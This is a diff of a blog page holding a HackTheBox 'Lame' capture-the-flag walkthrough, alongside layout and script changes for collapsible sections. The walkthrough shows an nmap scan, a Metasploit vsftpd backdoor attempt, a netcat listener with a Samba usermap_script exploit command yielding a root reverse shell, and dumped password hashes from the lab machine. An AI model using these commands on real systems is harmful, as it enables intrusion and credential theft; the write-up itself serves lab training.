@@ -31,19 +31,19 @@
       </table>
     </div>
     <div class="body">
-          <h1>[HackTheBox] Lame</h1>
+          <h1 class="h1 collapsible" onclick="toggle(this);">[HackTheBox] Lame</h1>
                   <p><a href="/posts/20191101_htb-legacy.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-blue.html"> » </a></p>
-                <h2>Overview</h2>
-<p>This is a writeup for HTB VM <a href="htps://www.hackthebox.eu/home/machines/profile/1">Lame</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
-<p><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_lame/machinescli.png.webp" /></p>
-<h3>Killchain</h3>
-<p>Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
-<p><img alt="writeup.overview.killchain" src="/static/files/posts_htb_lame/killchain.png.webp" /></p>
-<h3>TTPs</h3>
-<p>1. <code>139/tcp/netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_usermap">exploit_smb_usermap</a>  </p>
-<h2>Phase #1: Enumeration</h2>
-<p>1. Here's the Nmap scan result:  </p>
-<pre><code># Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for HTB VM <a href="htps://www.hackthebox.eu/home/machines/profile/1">Lame</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
+<p class="nested"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_lame/machinescli.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
+<p class="nested">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_lame/killchain.png.webp" /></p>
+<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
+<p class="nested">1. <code>139/tcp/netbios-ssn/Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_usermap">exploit_smb_usermap</a>  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<pre class="nested"><code># Nmap 7.70 scan initiated Fri Nov  1 12:30:13 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.lame/results/10.10.10.3/scans/xml/_quick_tcp_nmap.xml 10.10.10.3
 Nmap scan report for 10.10.10.3
 Host is up, received user-set (0.26s latency).
 Scanned at 2019-11-01 12:30:13 PDT for 94s
@@ -95,44 +95,44 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Nov  1 12:31:47 2019 -- 1 IP address (1 host up) scanned in 93.91 seconds
 </code></pre>
-<p>2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
-<p><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_lame/openports.png.webp" />  </p>
-<p>3. We find that the <code>vsftpd</code> service allows anonymous logins and as such connect to it but don't find anything inetresting there. We however find a MSF exploit for the <code>vsftpd</code> version <code>2.3.4</code>. This exploit failed to obtain a session:  </p>
-<pre><code>ftp 10.10.10.3
+<p class="nested">2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_lame/openports.png.webp" />  </p>
+<p class="nested">3. We find that the <code>vsftpd</code> service allows anonymous logins and as such connect to it but don't find anything inetresting there. We however find a MSF exploit for the <code>vsftpd</code> version <code>2.3.4</code>. This exploit failed to obtain a session:  </p>
+<pre class="nested"><code>ftp 10.10.10.3
 msfconsole
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOST 10.10.10.3
   show options
   exploit
 </code></pre>
-<p><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_lame/screenshot01.png.webp" />  </p>
-<p><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_lame/screenshot02.png.webp" />  </p>
-<p>4. We then explore the open (read+write) SMB share <code>tmp</code> but since there is no service (like HTTP for example) to leverage uploaded files, we move on:  </p>
-<pre><code>smbclient \\\\10.10.10.3\\tmp
+<p class="nested"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_lame/screenshot01.png.webp" />  </p>
+<p class="nested"><img alt="writeup.enumeration.steps.3.2" src="/static/files/posts_htb_lame/screenshot02.png.webp" />  </p>
+<p class="nested">4. We then explore the open (read+write) SMB share <code>tmp</code> but since there is no service (like HTTP for example) to leverage uploaded files, we move on:  </p>
+<pre class="nested"><code>smbclient \\\\10.10.10.3\\tmp
   dir
 </code></pre>
-<p><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_lame/screenshot03.png.webp" />  </p>
-<h3>Findings</h3>
-<h4>Open Ports</h4>
-<pre><code>21/tcp   |  ftp          |  vsftpd 2.3.4
+<p class="nested"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_htb_lame/screenshot03.png.webp" />  </p>
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
+<pre class="nested"><code>21/tcp   |  ftp          |  vsftpd 2.3.4
 22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  |  netbios-ssn  |  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 </code></pre>
-<h2>Phase #2: Exploitation</h2>
-<p>1. From the Nmap scan results we know that the SMB service version is <code>3.0.20-Debian</code> and upon searching for this version we come across the popular <code>usermap_script</code> exploit. There's a <a href="https://github.com/amriunix/CVE-2007-2447">Python script</a> for this exploit on GitHub. We follow the exploit instructions and gain a shell with elevated privileges on the target system:  </p>
-<pre><code>nc -nlvp 443
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. From the Nmap scan results we know that the SMB service version is <code>3.0.20-Debian</code> and upon searching for this version we come across the popular <code>usermap_script</code> exploit. There's a <a href="https://github.com/amriunix/CVE-2007-2447">Python script</a> for this exploit on GitHub. We follow the exploit instructions and gain a shell with elevated privileges on the target system:  </p>
+<pre class="nested"><code>nc -nlvp 443
 python usermap_script.py 10.10.10.3 139 10.10.14.18 443
 </code></pre>
-<p><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_lame/screenshot04.png.webp" />  </p>
-<p><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_lame/screenshot05.png.webp" />  </p>
-<p>2. We then read the contents of both <code>user.txt</code> and <code>root.txt</code> files to complete the challenge:  </p>
-<pre><code>cat /home/makis/user.txt
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_lame/screenshot04.png.webp" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_lame/screenshot05.png.webp" />  </p>
+<p class="nested">2. We then read the contents of both <code>user.txt</code> and <code>root.txt</code> files to complete the challenge:  </p>
+<pre class="nested"><code>cat /home/makis/user.txt
 cat /root/root.txt
 </code></pre>
-<p><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_lame/screenshot06.png.webp" />  </p>
-<h2>Phase #2.5: Post Exploitation</h2>
-<pre><code>root@lame&gt; id
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_lame/screenshot06.png.webp" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<pre class="nested"><code>root@lame&gt; id
 uid=0(root) gid=0(root)
 root@lame&gt;  
 root@lame&gt; uname
@@ -154,21 +154,21 @@ root@lame&gt; users
 root
 makis
 </code></pre>
-<h2>Loot</h2>
-<h3>Hashes</h3>
-<pre><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:............
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<pre class="nested"><code>root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:............
 sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0...........
 klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:............
 postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:............
 service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:............
 makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:............
 </code></pre>
-<h3>Flags</h3>
-<pre><code>/home/makis/user.txt: 69454a937d94f5f0225ea...........
+<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
+<pre class="nested"><code>/home/makis/user.txt: 69454a937d94f5f0225ea...........
 /root/root.txt: 92caac3be140ef409e4572..........
 </code></pre>
-<h2>References</h2>
-<ul>
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
 <li><a href="https://www.hackthebox.eu/home/machines/profile/1">https://www.hackthebox.eu/home/machines/profile/1</a>  </li>
 <li><a href="https://hackingresources.com/lame-hackthebox-walkthrough/">https://hackingresources.com/lame-hackthebox-walkthrough/</a>  </li>
 </ul>
@@ -177,19 +177,12 @@ makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:............
             </div>
     <div class="footer footercenter">
       <span>
-        <a href=https://creativecommons.org/licenses/by-sa/4.0/ class=footspan>  </a>
+        <a href="https://github.com/7h3rAm/7h3rAm.github.io" class="footspan">  </a>
       </span>
     </div>
     <script>hljs.initHighlightingOnLoad();</script>
     <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(s){
-        s.classList.toggle("expanded");
-        for(var l=s.nextElementSibling;l;){
-          l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
-        }
-      }
-    </script>
+    <script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script>
     <script data-goatcounter=https://manthan.goatcounter.com/count async src=//gc.zgo.at/count.js></script>
   </body>
 </html>
